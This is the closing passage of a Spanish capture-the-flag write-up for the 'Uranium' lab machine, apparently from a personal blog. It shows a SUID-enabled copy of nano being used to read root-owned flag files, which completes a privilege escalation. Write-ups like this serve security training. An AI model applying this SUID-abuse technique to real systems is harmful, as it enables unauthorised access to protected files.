</code></pre></div><p>¡Perfecto! Ahora tenemos el <code>SUID</code> en el binario <code>nano</code>, ¡así que podemos leer las flags restantes!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ ./nano /root/root.txt
kral4@uranium:/home/kral4$ ./nano /var/www/html/web_flag.txt
</code></pre></div><p>¡Y hemos &ldquo;rooteado&rdquo; la máquina!</p>
<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/jason/>
<span class=button__icon>←</span>
<span class=button__text>Jason - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/vulnnet-dotpy/>
<span class=button__text>VulnNet: dotpy - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">Lanfran02</div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>